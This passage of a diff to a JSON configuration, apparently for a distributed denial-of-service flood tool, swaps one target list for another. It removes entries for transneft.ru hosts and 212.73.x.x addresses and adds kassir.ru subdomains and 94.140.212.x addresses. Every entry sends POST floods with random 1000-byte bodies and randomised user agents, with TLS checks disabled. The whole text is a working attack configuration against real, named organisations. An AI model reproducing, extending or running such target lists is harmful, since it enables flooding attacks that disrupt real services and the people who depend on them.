+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://api.kassir.ru",
+                                "Referer": "https://api.kassir.ru",
+                                "X-Forwarded-Host": "api.kassir.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 11,
+            "name": "http://94.140.212.95",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "94.140.212.95:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://94.140.212.95",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://94.140.212.95",
+                                "Referer": "http://94.140.212.95",
+                                "X-Forwarded-Host": "94.140.212.95",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 11,
+            "name": "tcp://94.140.212.89:8080",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "94.140.212.89:8080"
                     }
                 },
                 "packet": {
@@ -1990,14 +735,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.134",
+            "count": 11,
+            "name": "https://94.140.212.94",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "212.73.103.134:443",
+                        "address": "94.140.212.94:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -2008,7 +753,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://212.73.103.134",
+                            "path": "https://94.140.212.94",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -2021,9 +766,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.134",
-                                "Referer": "https://212.73.103.134",
-                                "X-Forwarded-Host": "212.73.103.134",
+                                "Origin": "https://94.140.212.94",
+                                "Referer": "https://94.140.212.94",
+                                "X-Forwarded-Host": "94.140.212.94",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -2034,14 +779,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "http://212.73.103.114",
+            "count": 11,
+            "name": "http://94.140.212.89",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "212.73.103.114:80"
+                        "address": "94.140.212.89:80"
                     }
                 },
                 "packet": {
@@ -2049,7 +794,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://212.73.103.114",
+                            "path": "http://94.140.212.89",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -2062,9 +807,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://212.73.103.114",
-                                "Referer": "http://212.73.103.114",
-                                "X-Forwarded-Host": "212.73.103.114",
+                                "Origin": "http://94.140.212.89",
+                                "Referer": "http://94.140.212.89",
+                                "X-Forwarded-Host": "94.140.212.89",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -2075,14 +820,102 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "tcp://212.73.103.188:444",
+            "count": 11,
+            "name": "https://kassir.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "212.73.103.188:444"
+                        "address": "kassir.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://kassir.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://kassir.ru",
+                                "Referer": "https://kassir.ru",
+                                "X-Forwarded-Host": "kassir.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 11,
+            "name": "https://anyconnect2.kassir.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "anyconnect2.kassir.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://anyconnect2.kassir.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://anyconnect2.kassir.ru",
+                                "Referer": "https://anyconnect2.kassir.ru",
+                                "X-Forwarded-Host": "anyconnect2.kassir.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 11,
+            "name": "tcp://94.140.212.26:993",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "94.140.212.26:993"
                     }
                 },
                 "packet": {
@@ -2097,14 +930,187 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "tcp://212.73.103.93:1720",
+            "count": 11,
+            "name": "https://cdn.kassir.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "212.73.103.93:1720"
+                        "address": "cdn.kassir.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://cdn.kassir.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://cdn.kassir.ru",
+                                "Referer": "https://cdn.kassir.ru",
+                                "X-Forwarded-Host": "cdn.kassir.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 11,
+            "name": "https://report.kassir.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "report.kassir.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://report.kassir.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://report.kassir.ru",
+                                "Referer": "https://report.kassir.ru",
+                                "X-Forwarded-Host": "report.kassir.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 11,
+            "name": "http://94.140.212.242",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "94.140.212.242:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://94.140.212.242",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://94.140.212.242",
+                                "Referer": "http://94.140.212.242",
+                                "X-Forwarded-Host": "94.140.212.242",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 11,
+            "name": "https://report-crocus.kassir.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "report-crocus.kassir.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://report-crocus.kassir.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://report-crocus.kassir.ru",
+                                "Referer": "https://report-crocus.kassir.ru",
+                                "X-Forwarded-Host": "report-crocus.kassir.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 11,
+            "name": "tcp://94.140.212.26:587",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "94.140.212.26:587"
                     }
                 },
                 "packet": {
@@ -2119,14 +1125,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "tcp://212.73.103.156:143",
+            "count": 11,
+            "name": "tcp://94.140.213.21:587",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "212.73.103.156:143"
+                        "address": "94.140.213.21:587"
                     }
                 },
                 "packet": {
@@ -2141,17 +1147,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "https://aksmr.transneft.ru",
+            "count": 11,
+            "name": "http://kassir.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "aksmr.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "kassir.ru:80"
                     }
                 },
                 "packet": {
@@ -2159,7 +1162,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://aksmr.transneft.ru",
+                            "path": "http://kassir.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -2172,9 +1175,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://aksmr.transneft.ru",
-                                "Referer": "https://aksmr.transneft.ru",
-                                "X-Forwarded-Host": "aksmr.transneft.ru",
+                                "Origin": "http://kassir.ru",
+                                "Referer": "http://kassir.ru",
+                                "X-Forwarded-Host": "kassir.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -2185,102 +1188,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "https://remoteaccess.transneft.ru",
+            "count": 11,
+            "name": "tcp://94.140.213.21:143",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "remoteaccess.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://remoteaccess.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://remoteaccess.transneft.ru",
-                                "Referer": "https://remoteaccess.transneft.ru",
-                                "X-Forwarded-Host": "remoteaccess.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.238",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.238:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.238",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.238",
-                                "Referer": "https://212.73.103.238",
-                                "X-Forwarded-Host": "212.73.103.238",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "tcp://212.73.97.36:5101",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.97.36:5101"
+                        "address": "94.140.213.21:143"
                     }
                 },
                 "packet": {
@@ -2295,17 +1210,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "https://glonass.transneft.ru",
+            "count": 11,
+            "name": "http://api.kassir.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "glonass.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "api.kassir.ru:80"
                     }
                 },
                 "packet": {
@@ -2313,7 +1225,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://glonass.transneft.ru",
+                            "path": "http://api.kassir.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -2326,9 +1238,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://glonass.transneft.ru",
-                                "Referer": "https://glonass.transneft.ru",
-                                "X-Forwarded-Host": "glonass.transneft.ru",
+                                "Origin": "http://api.kassir.ru",
+                                "Referer": "http://api.kassir.ru",
+                                "X-Forwarded-Host": "api.kassir.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -2339,14 +1251,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "http://www.en.omega.transneft.ru",
+            "count": 11,
+            "name": "http://94.140.212.94",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "www.en.omega.transneft.ru:80"
+                        "address": "94.140.212.94:80"
                     }
                 },
                 "packet": {
@@ -2354,7 +1266,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://www.en.omega.transneft.ru",
+                            "path": "http://94.140.212.94",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -2367,9 +1279,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://www.en.omega.transneft.ru",
-                                "Referer": "http://www.en.omega.transneft.ru",
-                                "X-Forwarded-Host": "www.en.omega.transneft.ru",
+                                "Origin": "http://94.140.212.94",
+                                "Referer": "http://94.140.212.94",
+                                "X-Forwarded-Host": "94.140.212.94",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -2380,530 +1292,14 @@
         },
         {
             "type": "packetgen",
-            "count": 10,
-            "name": "http://212.73.103.122",
+            "count": 11,
+            "name": "tcp://94.140.212.88:8080",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "212.73.103.122:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://212.73.103.122",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://212.73.103.122",
-                                "Referer": "http://212.73.103.122",
-                                "X-Forwarded-Host": "212.73.103.122",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "http://vdi.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "vdi.transneft.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://vdi.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://vdi.transneft.ru",
-                                "Referer": "http://vdi.transneft.ru",
-                                "X-Forwarded-Host": "vdi.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://ftp2.gtp.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "ftp2.gtp.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://ftp2.gtp.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ftp2.gtp.transneft.ru",
-                                "Referer": "https://ftp2.gtp.transneft.ru",
-                                "X-Forwarded-Host": "ftp2.gtp.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.190",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.190:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.190",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.190",
-                                "Referer": "https://212.73.103.190",
-                                "X-Forwarded-Host": "212.73.103.190",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://212.73.103.178",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "212.73.103.178:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://212.73.103.178",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://212.73.103.178",
-                                "Referer": "https://212.73.103.178",
-                                "X-Forwarded-Host": "212.73.103.178",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://vpn02.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "vpn02.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://vpn02.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://vpn02.transneft.ru",
-                                "Referer": "https://vpn02.transneft.ru",
-                                "X-Forwarded-Host": "vpn02.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://mk.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "mk.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://mk.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://mk.transneft.ru",
-                                "Referer": "https://mk.transneft.ru",
-                                "X-Forwarded-Host": "mk.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://vpn01.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "vpn01.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://vpn01.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://vpn01.transneft.ru",
-                                "Referer": "https://vpn01.transneft.ru",
-                                "X-Forwarded-Host": "vpn01.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 10,
-            "name": "https://av.transneft.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "av.transneft.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://av.transneft.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://av.transneft.ru",
-                                "Referer": "https://av.transneft.ru",
-                                "X-Forwarded-Host": "av.transneft.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
